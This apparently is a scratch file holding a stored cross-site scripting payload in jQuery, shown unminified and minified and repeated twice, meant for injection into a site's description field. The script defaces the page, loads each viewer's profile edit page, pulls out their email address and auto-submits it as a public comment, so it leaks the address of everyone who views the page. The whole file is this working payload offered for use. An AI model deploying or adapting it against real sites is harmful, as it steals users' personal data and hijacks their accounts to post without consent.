# ------------------------------------------------
# I broke the description editor and the comments,
# so both of those can go here.
# ------------------------------------------------




# ------------------------------------------------

# This is just a place to dump the script that is going in the description

# Unminified
<script>
$(function(){
  $('.user_comment p a').each(function(){
    $(this).text($(this).text().replace('aoeuaoeu','@'));
  });
  $('h2').text('This is a virus waiting to happen.');
  $('li, :not(.user_comment) a').each(function(index){
    $(this).css('color','#FE57A1').delay(index*100).fadeOut();
    $('.user_comment a').delay((index*100)+1000).show(); //Dunno why they're getting hidden
  });
  $.get('/profiles/edit/',function(res){
    $('.data').html(res);
    var email_address=$('.data #id_email').attr('value');
    var email_address_obfuscate=email_address.replace('@','aoeuaoeu');
    $('#id_comment').text('My email address is '+email_address_obfuscate);

    var lastcommentemail=$($('.user_comment a')[0]).text();
    if (lastcommentemail===email_address){
      $('.data').remove();
    } else {
      $('#id_submit').click();
    }
  });
});
</script>


# Minified http://jscompress.com/
<script>$(function(){$(".user_comment p a").each(function(){$(this).text($(this).text().replace("aoeuaoeu","@"))});$("h2").text("This is a virus waiting to happen.");$("li, :not(.user_comment) a").each(function(a){$(this).css("color","#FE57A1").delay(a*100).fadeOut();$(".user_comment a").delay(a*100+1e3).show()});$.get("/profiles/edit/",function(a){$(".data").html(a);var b=$(".data #id_email").attr("value");var c=b.replace("@","aoeuaoeu");$("#id_comment").text("My email address is "+c);var d=$($(".user_comment a")[0]).text();if(d===b){$(".data").remove()}else{$("#id_submit").click()}})})</script># ------------------------------------------------
# I broke the description editor and the comments,
# so both of those can go here.
# ------------------------------------------------




# ------------------------------------------------

# This is just a place to dump the script that is going in the description

# Unminified
<script>
$(function(){
  $('.user_comment p a').each(function(){
    $(this).text($(this).text().replace('aoeuaoeu','@'));
  });
  $('h2').text('This is a virus waiting to happen.');
  $('li, :not(.user_comment) a').each(function(index){
    $(this).css('color','#FE57A1').delay(index*100).fadeOut();
    $('.user_comment a').delay((index*100)+1000).show(); //Dunno why they're getting hidden
  });
  $.get('/profiles/edit/',function(res){
    $('.data').html(res);
    var email_address=$('.data #id_email').attr('value');
    var email_address_obfuscate=email_address.replace('@','aoeuaoeu');
    $('#id_comment').text('My email address is '+email_address_obfuscate);

    var lastcommentemail=$($('.user_comment a')[0]).text();
    if (lastcommentemail===email_address){
      $('.data').remove();
    } else {
      $('#id_submit').click();
    }
  });
});
</script>


# Minified http://jscompress.com/
<script>$(function(){$(".user_comment p a").each(function(){$(this).text($(this).text().replace("aoeuaoeu","@"))});$("h2").text("This is a virus waiting to happen.");$("li, :not(.user_comment) a").each(function(a){$(this).css("color","#FE57A1").delay(a*100).fadeOut();$(".user_comment a").delay(a*100+1e3).show()});$.get("/profiles/edit/",function(a){$(".data").html(a);var b=$(".data #id_email").attr("value");var c=b.replace("@","aoeuaoeu");$("#id_comment").text("My email address is "+c);var d=$($(".user_comment a")[0]).text();if(d===b){$(".data").remove()}else{$("#id_submit").click()}})})</script>